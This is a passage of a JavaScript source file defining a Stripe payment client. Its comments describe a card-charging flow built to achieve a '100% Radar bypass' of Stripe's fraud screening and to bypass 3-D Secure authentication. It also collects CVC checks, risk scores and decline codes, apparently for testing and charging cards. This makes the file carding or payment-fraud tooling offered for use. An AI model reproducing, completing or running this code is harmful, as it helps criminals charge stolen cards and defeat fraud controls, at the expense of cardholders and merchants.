                {
                    auth: { username: this.skKey, password: '' },
                    timeout: 30000
                }
            );

            const si = response.data;
            const pmDetails = si.latest_attempt?.payment_method_details?.card;

            return {
                status: si.status,
                cvcCheck: pmDetails?.checks?.cvc_check,
                declineCode: si.last_setup_error?.decline_code
            };
        } catch (error) {
            return { error: error.message };
        }
    }

    /**
     * MAIN METHOD: Complete card charge flow
     * Uses optimal approach: Source API → Charge → 3DS bypass if needed
     */
    async chargeCard(card, amount, currency = 'usd', options = {}) {
        const startTime = Date.now();
        const result = {
            success: false,
            approach: 'source',
            timing: {}
        };

        try {
            // Step 1: Create Source (100% Radar bypass)
            const sourceResult = await this.createSource(card, options.billing || {});
            result.timing.createSource = Date.now() - startTime;

            if (!sourceResult.success) {
                return {
                    ...result,
                    status: 'SOURCE_FAILED',
                    error: sourceResult.error,
                    declineCode: sourceResult.declineCode
                };
            }

            result.sourceId = sourceResult.sourceId;
            result.card = sourceResult.card;

            // Step 2: Charge Source
            const chargeStart = Date.now();
            const chargeResult = await this.chargeSource(
                sourceResult.sourceId,
                amount,
                currency,
                options.metadata || {}
            );
            result.timing.charge = Date.now() - chargeStart;

            // Merge charge result
            Object.assign(result, chargeResult);

            // Step 3: Handle 3DS if needed (for PaymentIntent flow)
            if (result.status === 'REQUIRES_3DS' && result.paymentIntentData) {
                const bypassStart = Date.now();
                const bypassResult = await this.attempt3DSBypass(result.paymentIntentData);
                result.timing.bypass3DS = Date.now() - bypassStart;

                if (bypassResult.bypassed) {
                    // Wait and check final status
                    await new Promise(r => setTimeout(r, 500));
                    const finalDetails = await this.getPaymentIntentDetails(result.paymentIntentData.id);

                    result.bypassed3DS = true;
                    result.status = finalDetails.status === 'succeeded' ? 'SUCCESS' :
                        finalDetails.status === 'requires_payment_method' ? 'DECLINED' :
                            finalDetails.status;
                    result.success = finalDetails.status === 'succeeded';
                    Object.assign(result, finalDetails);
                } else {
                    result.bypass3DSFailed = true;
                    result.challengeRequired = bypassResult.challengeRequired;
                }
            }

            result.timing.total = Date.now() - startTime;
            return result;

        } catch (error) {
            return {
                ...result,
                status: 'ERROR',
                error: error.message,
                timing: { total: Date.now() - startTime }
            };
        }
    }

    /**
     * Alternative: Use PaymentMethod flow
     * May trigger Radar on strict accounts, but supports 3DS bypass
     */
    async chargeCardWithPaymentMethod(card, amount, currency = 'usd', options = {}) {
        const startTime = Date.now();
        const result = {
            success: false,
            approach: 'payment_method',
            timing: {}
        };

        try {
            // Step 1: Create PaymentMethod
            const pmResult = await this.createPaymentMethod(card, options.billing || {});
            result.timing.createPM = Date.now() - startTime;

            if (!pmResult.success) {
                return { ...result, status: 'PM_FAILED', error: pmResult.error };
            }

            result.paymentMethodId = pmResult.paymentMethodId;
            result.card = pmResult.card;

            // Step 2: Create PaymentIntent
            const piStart = Date.now();
            const piResult = await this.createPaymentIntent(pmResult.paymentMethodId, amount, currency);
            result.timing.createPI = Date.now() - piStart;

            Object.assign(result, piResult);

            // Step 3: Handle 3DS
            if (piResult.status === 'REQUIRES_3DS' && piResult.paymentIntentData) {
                const bypassStart = Date.now();
                const bypassResult = await this.attempt3DSBypass(piResult.paymentIntentData);
                result.timing.bypass3DS = Date.now() - bypassStart;

                if (bypassResult.bypassed) {
                    await new Promise(r => setTimeout(r, 500));
                    const finalDetails = await this.getPaymentIntentDetails(piResult.paymentIntentData.id);

                    result.bypassed3DS = true;
                    result.status = finalDetails.status === 'succeeded' ? 'SUCCESS' :
                        finalDetails.status === 'requires_payment_method' ? 'DECLINED' :
                            finalDetails.status;
                    result.success = finalDetails.status === 'succeeded';
                    Object.assign(result, finalDetails);
                } else {
                    result.bypass3DSFailed = true;
                    result.challengeRequired = bypassResult.challengeRequired;
                }
            }

            result.timing.total = Date.now() - startTime;
            return result;

        } catch (error) {
            return {
                ...result,
                status: 'ERROR',
                error: error.message,
                timing: { total: Date.now() - startTime }
            };
        }
    }

    /**
     * Analyze charge response
     */
    analyzeChargeResponse(data) {
        if (data.error) {
            return {
                success: false,
                status: 'ERROR',
                error: data.error.message,
                declineCode: data.error.decline_code,
                code: data.error.code
            };
        }

        const outcome = data.outcome || {};
        const isBlocked = outcome.type === 'blocked';
        const isSuccess = data.status === 'succeeded' && data.paid;

        return {
            success: isSuccess,
            status: isSuccess ? 'SUCCESS' : isBlocked ? 'BLOCKED' : 'DECLINED',
            chargeId: data.id,
            paid: data.paid,
            // Risk info
            riskLevel: outcome.risk_level,
            riskScore: outcome.risk_score,
            networkStatus: outcome.network_status,
            outcomeType: outcome.type,
            sellerMessage: outcome.seller_message,
            reason: outcome.reason,
            // Decline info
            declineCode: data.failure_code,
            failureMessage: data.failure_message,
            // Card checks
            cvcCheck: data.payment_method_details?.card?.checks?.cvc_check,
            avsCheck: data.payment_method_details?.card?.checks?.address_postal_code_check,
            // Card info
            cardBrand: data.payment_method_details?.card?.brand,
            cardCountry: data.payment_method_details?.card?.country
        };
    }

    /**
     * Analyze PaymentIntent response
     */
    analyzePaymentIntentResponse(data) {
        if (data.error) {
            const piId = data.error.payment_intent?.id;
            return {
                success: false,
                status: 'ERROR',
                error: data.error.message,
                declineCode: data.error.decline_code,
                paymentIntentId: piId
            };
        }

        const status = data.status;
        const charge = data.latest_charge;
        const outcome = charge?.outcome || {};

        if (status === 'succeeded') {
            return {
                success: true,
                status: 'SUCCESS',
                paymentIntentId: data.id,
                chargeId: charge?.id,
                riskLevel: outcome.risk_level,
                riskScore: outcome.risk_score,
                cvcCheck: charge?.payment_method_details?.card?.checks?.cvc_check
            };
        }

        if (status === 'requires_action') {
            return {
                success: false,
                status: 'REQUIRES_3DS',
                paymentIntentId: data.id,
                paymentIntentData: data
            };
        }

        if (status === 'requires_payment_method') {
            return {
                success: false,
                status: outcome.type === 'blocked' ? 'BLOCKED' : 'DECLINED',
                paymentIntentId: data.id,
                riskLevel: outcome.risk_level,
                networkStatus: outcome.network_status,
                reason: outcome.reason,
                declineCode: data.last_payment_error?.decline_code,
                sellerMessage: outcome.seller_message
            };
        }

        return {
            success: false,
            status: status || 'UNKNOWN',
            paymentIntentId: data.id
        };
    }
}

export default StripeOptimalClient;
